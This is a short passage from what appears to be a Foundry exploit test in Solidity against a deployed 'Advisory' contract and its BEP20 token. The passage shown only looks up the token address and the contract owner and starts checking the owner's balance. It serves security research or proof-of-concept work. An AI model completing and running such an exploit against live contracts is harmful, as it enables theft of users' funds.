        vm.label(contractOwner, "ContractOwner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the token address from the advisory contract
        address tokenAddress = Advisory(TARGET).token();
        IBEP20 token = IBEP20(tokenAddress);
        vm.label(tokenAddress, "Nugentoken");

        // Step 2: Find a token holder (try the contract owner first)
        address contractOwner = Advisory(TARGET).owner();

        // Check owner's token balance
